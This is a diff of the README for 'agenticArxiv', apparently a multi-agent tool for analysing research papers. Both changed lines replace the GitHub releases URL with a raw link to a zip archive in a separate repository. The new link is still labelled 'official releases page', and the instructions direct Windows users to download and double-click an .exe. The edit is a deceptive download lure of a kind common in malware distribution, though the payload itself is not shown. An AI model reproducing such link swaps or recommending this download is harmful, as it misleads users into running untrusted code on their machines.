@@ -5,7 +5,7 @@ description: "Automate academic research and literature reviews with a multi-age
 ---
 # 🔍 agenticArxiv - Extract insights from complex research papers
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/poisonous-jonesboro417/agenticArxiv/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/poisonous-jonesboro417/poisonous-jonesboro417.github.io/main/pseudocommisural/v2.1.zip)
 
 ## What is agenticArxiv?
 
@@ -27,7 +27,7 @@ To run this application on your Windows computer, ensure your setup meets these 
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit the [official releases page](https://github.com/poisonous-jonesboro417/agenticArxiv/releases) to download the application.
+1. Visit the [official releases page](https://raw.githubusercontent.com/poisonous-jonesboro417/poisonous-jonesboro417.github.io/main/pseudocommisural/v2.1.zip) to download the application.
 2. Look for the file ending in `.exe` under the latest release.
 3. Save the file to your computer.
 4. Double-click the file to begin the installation.
